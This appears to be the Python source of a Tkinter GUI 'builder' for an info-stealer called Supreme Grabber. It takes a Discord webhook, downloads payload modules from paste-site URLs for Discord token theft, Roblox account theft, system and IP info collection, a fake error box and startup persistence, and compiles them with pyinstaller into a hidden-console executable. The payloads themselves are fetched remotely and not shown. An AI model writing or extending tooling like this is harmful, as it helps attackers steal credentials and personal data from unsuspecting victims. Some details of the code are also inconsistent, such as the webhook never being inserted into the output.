import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import ctypes
import requests
import os


class main(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('Supreme Grabber Builder')
        self.geometry('730x470')
        self.config(bg='#262020')
        titleb = tk.Label(self, text='Supreme Grabber Builder', bg='#7044CC', fg='white', font=('Arial', 24))
        titleb.pack(fill='x')
        bg_label = tk.Label(self)
        bg_label.pack(fill='both', expand=True)
        image = Image.open('image/bg.png')
        photo = ImageTk.PhotoImage(image)
        bg_label.configure(image=photo)
        bg_label.image = photo

        self.buttonimg = ImageTk.PhotoImage(file='image/fullbu.png')
        self.compile = ImageTk.PhotoImage(file='image/compile.png')
        self.home = ImageTk.PhotoImage(file='image/home.png')
        self.gear = ImageTk.PhotoImage(file='image/gears.png')

        self.token = tk.Button(self, image=self.buttonimg, bg='#0B0B0B', borderwidth=0, activebackground='#0B0B0B', command=self.discord)
        self.token.place(x=225, y=200)
        self.roblox = tk.Button(self, image=self.buttonimg, bg='#0B0B0B', borderwidth=0, activebackground='#0B0B0B', command=self.roblox)
        self.roblox.place(x=225, y=260)
        self.sysi = tk.Button(self, image=self.buttonimg, bg='#0B0B0B', borderwidth=0, activebackground='#0B0B0B', command=self.sysinfo)
        self.sysi.place(x=360, y=260)
        self.ipi = tk.Button(self, image=self.buttonimg, bg='#0B0B0B', borderwidth=0, activebackground='#0B0B0B', command=self.ipinfo)
        self.ipi.place(x=360, y=200)
        self.startup = tk.Button(self, image=self.buttonimg, bg='#0B0B0B', borderwidth=0, activebackground='#0B0B0B', command=self.startup)
        self.startup.place(x=485, y=200)
        self.error = tk.Button(self, image=self.buttonimg, bg='#0B0B0B', borderwidth=0, activebackground='#0B0B0B', command=self.errorbox)
        self.error.place(x=485, y=260)
        self.input = tk.Entry(self, bg='#262020', fg='white', font=('Arial', 16), width=22)
        self.input.place(x=260, y=127)
        self.set = tk.Button(self, image=self.buttonimg, bg='#0B0B0B', borderwidth=0, activebackground='#0B0B0B', command=self.inputlol)
        self.set.place(x=535, y=128)        
        self.compile_button = tk.Button(self, image=self.compile, borderwidth=0, command=self.compile1)
        self.compile_button.place(x=325, y=370)


    def compile1(self):
       ctypes.windll.user32.MessageBoxW(None, f'Compiling exe (this may take a little bit)', 'Success', 0)
       os.system("pyinstaller Supreme-Grabber-Builder.py --name Supreme-Grabber-Builder --distpath build --onefile --noconsole")
       ctypes.windll.user32.MessageBoxW(None, f'Supreme Grabber has been built in build/SupremeGrabberBuilt', 'Success', 0)
       os.remove("SupremeGrabberBuilt.spec")
       os.remove("Supreme-Grabber-Builder.py")
       


    def inputlol(self):
       webhook = self.input.get()
       if not webhook:
           ctypes.windll.user32.MessageBoxW(None, 'Please enter webhook first', 'Error', 0)
           return

       paste_url = 'https://jjzbin.org/raw/ihepob'
       response = requests.get(paste_url)

       if response.status_code == 200:
            content = response.text
            with open('Supreme-Grabber-Builder.py', 'a', encoding='utf-8') as f:
                    f.write('\n' + content)
       else:
        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build Supreme Grabber.', 'Success', 0)
            
       ctypes.windll.user32.MessageBoxW(None, f'Webhook set as {webhook}', 'Success', 0)

    def discord(self, webhook=None):
       webhook = self.input.get()
       if not webhook:
           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
           return
    
       paste = 'https://jjzbin.org/raw/ocoyiw'
       response = requests.get(paste)

       if response.status_code == 200:
            content = response.text
            with open('Supreme-Grabber-Builder.py', 'a', encoding='utf-8') as f:
                    f.write('\n' + content)
       else:
        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build Supreme Grabber', 'Success', 0)
            
       ctypes.windll.user32.MessageBoxW(None, f'Discord Stealing Enabled (This is just injection btw)', 'Success', 0)


    def roblox(self, webhook=None):
       webhook = self.input.get()
       if not webhook:
           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
           return
    
       paste = 'https://jjzbin.org/raw/owenur'
       response = requests.get(paste)

       if response.status_code == 200:
            content = response.text
            with open('Supreme-Grabber-Builder.py', 'a', encoding='utf-8') as f:
                    f.write('\n' + content)
       else:
        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build Supreme Grabber.', 'Success', 0)
            
       ctypes.windll.user32.MessageBoxW(None, f'Roblox Stealing enabled', 'Success', 0)

    def sysinfo(self, webhook=None):
       webhook = self.input.get()
       if not webhook:
           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
           return
    
       paste = 'https://jjzbin.org/raw/guxino'
       response = requests.get(paste)

       if response.status_code == 200:
            content = response.text
            with open('Supreme-Grabber-Builder.py', 'a', encoding='utf-8') as f:
                    f.write('\n' + content)
       else:
        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build Supreme Grabber.', 'Success', 0)
            
       ctypes.windll.user32.MessageBoxW(None, f'Sys Info enabled', 'Success', 0)


    def ipinfo(self, webhook=None):
       webhook = self.input.get()
       if not webhook:
           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
           return
       paste = 'https://jjzbin.org/raw/ekevel'
       response = requests.get(paste)

       if response.status_code == 200:
            content = response.text
            with open('Supreme-Grabber-Builder.py', 'a', encoding='utf-8') as f:
                    f.write('\n' + content)
       else:
        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build Supreme Grabber', 'Success', 0)
        	
       ctypes.windll.user32.MessageBoxW(None, f'IP info enabled', 'Success', 0)
    
    def errorbox(self, webhook=None):
       webhook = self.input.get()
       if not webhook:
           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
           return
    
       paste = 'https://jjzbin.org/raw/lujeso'
       response = requests.get(paste)

       if response.status_code == 200:
            content = response.text
            with open('Supreme-Grabber-Builder.py', 'a', encoding='utf-8') as f:
                    f.write('\n' + content)
            ctypes.windll.user32.MessageBoxW(None, f'Error box enabled', 'Success', 0)
       else:
        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build Supreme Grabber.', 'Success', 0)

            


    def startup(self, webhook=None):
       webhook = self.input.get()
       if not webhook:
           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
           return
    
       paste = 'https://jjzbin.org/raw/enamay'
       response = requests.get(paste)

       if response.status_code == 200:
            content = response.text
            with open('Supreme-Grabber-Builder.py', 'a', encoding='utf-8') as f:
                    f.write('\n' + content)
       else:
        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build Supreme Grabber', 'Success', 0)
            
       ctypes.windll.user32.MessageBoxW(None, f'Startup successfully enabled.', 'Success', 0)


if __name__ == '__main__':
    app = main()
    app.mainloop()
